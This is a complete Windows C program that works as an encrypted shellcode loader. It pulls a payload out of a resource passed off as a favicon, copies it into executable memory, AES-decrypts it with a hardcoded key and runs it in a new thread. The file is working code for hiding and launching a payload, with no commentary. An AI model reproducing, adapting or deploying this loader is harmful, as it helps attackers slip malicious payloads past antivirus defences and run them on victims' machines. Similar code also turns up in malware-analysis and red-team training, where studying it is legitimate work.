#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <winuser.h>
#include <psapi.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

#include "resource.h"


int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}



int main() {
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned char* payload;
	unsigned int payload_len;

	HGLOBAL resHandle = NULL;
	HRSRC res;

	char key[] = { 0x80, 0x79, 0xea, 0xa8, 0xfc, 0xe4, 0x64, 0x6b, 0x17, 0x79, 0xa0, 0x7a, 0x4e, 0x5f, 0xc3, 0x91 };


	res = FindResource(NULL, MAKEINTRESOURCE(IDR_FAVICON1), RT_RCDATA);
	if (res == NULL) {
		DWORD errorCode = GetLastError();
		printf("Could not find resource! Error code: %d\n", errorCode);
		return 0;
	}
	resHandle = LoadResource(NULL, res);
	payload = (unsigned char*)LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory(exec_mem, payload, payload_len);

	AESDecrypt((char*)exec_mem, payload_len, key, sizeof(key));

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READWRITE, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}